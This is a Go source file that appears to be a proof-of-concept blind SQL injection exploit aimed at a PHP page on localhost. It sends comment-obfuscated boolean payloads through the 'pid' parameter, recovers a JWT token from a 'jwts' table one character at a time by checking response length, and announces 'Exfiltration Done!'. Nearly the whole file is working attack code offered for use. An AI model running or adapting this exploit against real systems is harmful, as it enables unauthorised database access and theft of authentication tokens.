package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"strconv"
	"strings"

	"github.com/fatih/color"
)

var totalRequests int

func injecti(query string) int {
	retchar := 0
	for i := 32; i < 126; i++ {
		totalRequests++
		target := "http://localhost:8888/index.php?pid="
		target = target + strings.Replace(query, "[CHAR]", strconv.Itoa(i), -1)
		// fmt.Println(target)
		// start := time.Now()
		resp, _ := http.Get(target)
		bytes, _ := ioutil.ReadAll(resp.Body)
		stringbody := string(bytes)
		// fmt.Println(stringbody)
		resp.Body.Close()
		// elapsed := time.Since(start).Seconds()
		// fmt.Printf("http.Get to Target took %v seconds \n", elapsed)
		// if elapsed > 1 {
		// retchar = i
		// }
		if len(stringbody) > 30 {
			// fmt.Println(stringbody)
			retchar = i
		}
	}
	return retchar
}
func main() {
	color.Magenta("[+] Retriving JWT Tokens [Traditional Way].....")
	fmt.Print("[+] ")
	totalRequests = 0
	payload := "1/**/AND/**/(ascii(substring((select/**/jwt/**/from/**/jwts/**/),[cho],1))=[CHAR])"

	for i := 0; i < 155; i++ {
		//155: length of the Token, Could be dynamic
		payloadi := strings.Replace(payload, "[cho]", strconv.Itoa(i), -1)

		getcharacter := (injecti(payloadi))
		fmt.Printf("%c", getcharacter)
	}

	color.Red("\n[+] Number of Requests: %d\n", totalRequests)
	fmt.Println("[+] Exfiltration Done!")

}
